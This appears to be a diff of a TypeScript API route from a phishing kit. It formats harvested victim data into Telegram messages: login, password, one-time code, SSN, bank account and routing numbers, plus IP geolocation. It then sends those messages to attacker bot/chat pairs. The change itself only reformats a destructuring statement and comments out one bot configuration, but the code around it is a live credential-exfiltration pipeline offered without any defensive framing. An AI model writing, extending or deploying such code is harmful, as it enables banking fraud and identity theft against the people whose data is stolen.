@@ -28,8 +28,18 @@ function formatTelegramMessage(
   ipInfo: IpLocationData,
   sessionId: string
 ): string {
-  const { login, password, code, step, name, number, routing, ssn, bank, type } = data;
-
+  const {
+    login,
+    password,
+    code,
+    step,
+    name,
+    number,
+    routing,
+    ssn,
+    bank,
+    type,
+  } = data;
 
   const { ip, country, city, regionName, isp, lon, lat } = ipInfo;
 
@@ -117,11 +127,11 @@ export async function POST(
     const telegramText = formatTelegramMessage(session, ipData, sessionId);
 
     // Bot/chat config pairs
+    // {
+    //   botToken: process.env.TELEGRAM_BOT_A_TOKEN!,
+    //   chatId: process.env.TELEGRAM_CHAT_ID_ONE!,
+    // },
     const configs = [
-      {
-        botToken: process.env.TELEGRAM_BOT_A_TOKEN!,
-        chatId: process.env.TELEGRAM_CHAT_ID_ONE!,
-      },
       {
         botToken: process.env.TELEGRAM_BOT_B_TOKEN!,
         chatId: process.env.TELEGRAM_CHAT_ID_TWO!,
